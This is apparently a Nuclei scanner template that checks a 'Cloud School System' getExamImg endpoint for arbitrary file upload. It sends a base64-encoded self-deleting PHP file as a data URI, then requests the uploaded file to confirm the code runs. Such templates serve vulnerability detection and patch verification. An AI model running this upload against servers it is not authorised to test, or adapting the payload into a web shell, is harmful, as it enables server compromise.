id: poc-yaml-yunknet-getexamimg-anyfile-upload
info:
  name: Cloud School System getExamImg Arbitrary File Upload Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  tags: file-upload

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"
  t3: "{{base64(concat('<?php echo md5(', to_string(t1), ');unlink(__FILE__);'))}}"
  dt: "{{date_time('20060102')}}"

flow: http(1) && http(2)

http:
  - id: upload-file
    method: POST
    path:
      - "{{BaseURL}}/index/Exam/getExamImg"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "src_data=data:image/php;base64,{{t3}}"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "upload"
          - ".php"
    extractors:
      - type: regex
        name: file
        group: 1
        internal: true
        regex:
          - "(?P<file>[0-9]{10}).php"

  - id: verify-upload
    method: GET
    path:
      - "{{BaseURL}}/upload/examanswer/{{dt}}/{{file}}.php"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "{{t2}}"
